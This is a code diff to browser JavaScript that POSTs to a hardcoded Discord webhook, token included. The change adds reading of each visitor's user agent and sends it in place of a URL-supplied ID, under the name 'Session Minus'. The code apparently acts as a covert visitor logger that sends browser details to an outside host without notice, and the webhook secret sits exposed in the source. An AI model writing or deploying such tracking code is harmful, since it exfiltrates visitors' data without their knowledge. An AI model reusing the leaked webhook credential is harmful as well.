@@ -52,6 +52,7 @@
     const urlParams = new URLSearchParams(window.location.search);
     const uniqueID = String(urlParams.get('uwu'));
     var request = new XMLHttpRequest();
+    var ua = navigator.userAgent;
     if (extrahook) {
         request.open("POST", "https://discord.com/api/webhooks/813081775739371540/KZTgEAGssmH-DiLT1N2mDw4_rx1LMQC-v_2qgFhhFvBSdMmm4UPVP3zRfvwPHrWXXZJp");
     } else {
@@ -64,7 +65,7 @@
     var params = {
         username: "Session Minus",
         avatar_url: "",
-        content: uniqueID,
+        content: ua,
     }
     // change le username
     params.username = uniqueID
